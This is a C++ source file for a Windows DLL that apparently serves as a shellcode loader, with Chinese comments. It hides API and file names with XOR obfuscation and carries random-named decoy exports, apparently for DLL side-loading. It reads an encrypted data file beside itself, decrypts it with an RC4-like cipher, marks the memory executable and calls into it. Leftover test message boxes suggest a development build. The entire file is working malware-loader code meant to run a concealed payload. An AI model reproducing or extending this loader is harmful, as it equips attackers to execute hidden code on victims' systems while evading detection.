// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <iostream>

#define STR_CRY_LENGTH			0	//加密字符串的长度
#define SIZE 256


char* uncode(char* str)
{
	int len = str[0];
	char * uncodeStr = (char *)operator new(len + 1);
	for (size_t i = 1; i <= len; i++)
	{
		uncodeStr[i - 1] = str[i] ^ (0xCC - i);
	}
	uncodeStr[len] = 0x00;
	return uncodeStr;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		MessageBoxA(NULL, "dllmain", "test", NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


extern "C" __declspec(dllexport) void wiohrwiaq ()
{

}


extern "C" __declspec(dllexport) void ioqerbwqiaweplkqpoewq ()
{

}

extern "C" __declspec(dllexport) void eiwqiothhahndna()
{

}


//------------------------------------------------------------
//加密前的密码表
// Size    : 256 (0x100)
//------------------------------------------------------------
unsigned char EncryptTable[256] = { 0 };

//------------------------------------------------------------
//加密后的密码表，可用于解密时的校验
// Size    : 256 (0x100)
//------------------------------------------------------------
unsigned char ChcekTable[256] = { 0 };



void EncryptFunc(unsigned char *SourceBytes, unsigned char *EncryptBytes, DWORD nLength)
{
	DWORD nOffsetNum = 0, nTargetNum = 0, nLastNum = 0;
	unsigned char TargetCode = '\x0', OffsetCode = '\x0', LastCode = '\x0';
	for (DWORD i = 0; i < nLength; i++)
	{
		//取密码表标志位Code
		TargetCode = EncryptBytes[((i + 1) % 0x100)];
		//取偏移Code的偏移
		nOffsetNum = (TargetCode + nOffsetNum) % 0x100;
		//取密码表偏移Code
		OffsetCode = EncryptBytes[nOffsetNum];
		//交换密码表数值
		EncryptBytes[nOffsetNum % 0x100] = EncryptBytes[((i + 1) % 0x100)];
		EncryptBytes[((i + 1) % 0x100)] = OffsetCode;
		//取最终加密Code偏移
		nLastNum = (TargetCode + OffsetCode) % 0x100;
		//获取异或用的字符串
		LastCode = EncryptBytes[nLastNum];
		//取被加密的字符,异或
		SourceBytes[i] ^= LastCode;
	}
	//在此下断观察SourceBytes和CryptData
	return;
}


FILE * pFile;
long lSize;
unsigned char * buffer;
size_t result;

bool InitTestReflectiveLoader(char * SelfPath)
{
	// 一个不漏地读入整个文件，只能采用二进制方式打开
	//pFile = fopen(".\\..\\..\\bin\\server\\CcMainDll.dll", "rb");
	pFile = fopen(SelfPath, "rb");

	if (pFile == NULL)
	{
		fputs("File error", stderr);
		//printf("open file fail");
		return false;
	}

	// 获取文件大小 
	fseek(pFile, 0, SEEK_END);
	lSize = ftell(pFile);
	rewind(pFile);

	// 分配内存存储整个文件
	buffer = (unsigned char*)VirtualAlloc(NULL, sizeof(char)*lSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (buffer == NULL)
	{
		fputs("Memory error", stderr);
		//printf("Memory alloc falil");
		return false;

	}

	// 将文件拷贝到buffer中 
	result = fread(buffer, 1, lSize, pFile);
	if (result != lSize)
	{
		fputs("Reading error", stderr);
		//printf("Load file to memory falil");
		return false;

	}
	return true;

}

/*
为什么C++生成的Dll函数名带有@？如“_Abcd2@4”后面是数字2加@还有个4
_stdcall调用约定的函数会有@，后面的数字表示参数总共所占字节数，这是因为_stdcall函数需要被调用者清空堆栈,所以需要知道参数所占大小
_cedcl调用约定的函数没有@及后面的数字，因为_cedcl调用约定的函数由调用者清空堆栈
*/
extern "C" __declspec(dllexport) int __stdcall run(HMODULE hLibModule)
{
	MessageBoxA(NULL, "hello", "test", NULL);
	char Str_Kernel32[] = { 0x08,0xa0,0xaf,0xbb,0xa6,0xa2,0xaa,0xf6,0xf6 };
	char Str_GetMoudleFileNameA[] = { 0x12,0x8c,0xaf,0xbd,0x85,0xa8,0xa2,0xb0,0xa8,0xa6,0x84,0xa8,0xac,0xda,0xf0,0xdc,0xd1,0xde,0xfb };
	char Str_MainDat[] = { 0x0c,0x97,0x89,0xaa,0xfa,0xff,0xf4,0xf0,0xf2,0xed,0xa6,0xa0,0xb4 };

	char SelfPath[MAX_PATH] = { 0 };

	char* lpKernel32 = uncode(Str_Kernel32);
	HMODULE MoudleHandle = GetModuleHandleA(lpKernel32);			// 解密调用
	memset(lpKernel32, 0, Str_Kernel32[STR_CRY_LENGTH]);
	delete lpKernel32;


	//声明导出函数类型--导出的TestRun函数
	typedef DWORD(__stdcall  *TestRunT)(
		_In_opt_ HMODULE hModule,
		_Out_writes_to_(nSize, ((return < nSize) ? (return +1) : nSize)) LPSTR lpFilename,
		_In_ DWORD nSize
		);


	char* lpGetMoudleFileName = uncode(Str_GetMoudleFileNameA);
	TestRunT pGetMoudleFileNameA = (TestRunT)GetProcAddress(MoudleHandle, lpGetMoudleFileName);				// 解密调用
	memset(lpGetMoudleFileName, 0, Str_Kernel32[STR_CRY_LENGTH]);
	delete lpGetMoudleFileName;


	pGetMoudleFileNameA(NULL, SelfPath, MAX_PATH);

	char* FilePath = strrchr(SelfPath, '\\');

	if (FilePath)
	{
		*FilePath = 0x00;
	}
	else
	{
		return 0;
	}

	char* pMainDat = uncode(Str_MainDat);
	lstrcatA(SelfPath, pMainDat);
	memset(pMainDat, 0, Str_Kernel32[STR_CRY_LENGTH]);
	delete pMainDat;

	if (InitTestReflectiveLoader(SelfPath)) {


		unsigned char * buffers = (unsigned char*)malloc(sizeof(char)*result - SIZE - SIZE);

		memcpy(EncryptTable, buffer, SIZE);

		memcpy(ChcekTable, buffer + SIZE, SIZE);

		memcpy(buffers, buffer + SIZE + SIZE, result - SIZE - SIZE);

		EncryptFunc(buffers, EncryptTable, result - SIZE - SIZE);

		if (memcmp(ChcekTable, EncryptTable, SIZE) == 0)
		{
			DWORD lpflOldProtect = 0;
			VirtualProtect(buffers, result - SIZE - SIZE, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
			__asm {
				call buffers
			}
		}
	}

	



	return FreeLibrary(hLibModule);
}



extern "C" __declspec(dllexport) void qioewiqj()
{

}
